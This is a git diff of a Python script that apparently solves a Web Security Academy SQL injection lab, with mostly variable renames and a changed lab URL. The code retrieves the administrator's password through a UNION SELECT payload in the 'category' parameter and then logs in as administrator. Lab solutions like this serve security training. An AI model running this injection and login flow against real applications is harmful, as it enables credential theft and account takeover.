@@ -1,6 +1,6 @@
 #########################################################################################
 #
-# Author: Ahmed Elqalawii
+# Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 21/9/2023
 #
@@ -26,18 +26,18 @@ import re
 # Main
 #########
 # change this url to your lab
-url = "https://0a9e0054033ce46282e492310014002d.web-security-academy.net"
+url = "https://0aea0080046a2eb588f5971100150069.web-security-academy.net"
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 
 try:
     # payload to retreive the password of the administrator
-    admin_password_payload = f"' union SELECT username, password from users where username = 'administrator'-- -"
+    payload = f"' union SELECT username, password from users where username = 'administrator'-- -"
     # fetch the page with the injected payload
-    admin_password_injection = requests.get(
-        f"{url}/filter?category={admin_password_payload}")
+    injection = requests.get(
+        f"{url}/filter?category={payload}")
     # extract the administrator password
     admin_password = re.findall("<td>(.*)</td>",
-                                admin_password_injection.text)[0]
+                                injection.text)[0]
     print(Fore.WHITE + "1. Retrieving administrator password from users table.. " +
           Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
 
@@ -61,12 +61,12 @@ try:
             cookies = {
                 "session": session
             }
-            login_inject = requests.post(f"{url}/login", data,
-                                         cookies=cookies, allow_redirects=False)
+            login = requests.post(f"{url}/login", data,
+                                  cookies=cookies, allow_redirects=False)
             print(
                 Fore.WHITE + "4. Logging in as the administrator.. " + Fore.GREEN + "OK")
             # extract new session
-            new_session = login_inject.cookies.get("session")
+            new_session = login.cookies.get("session")
             cookies = {
                 "session": new_session
             }
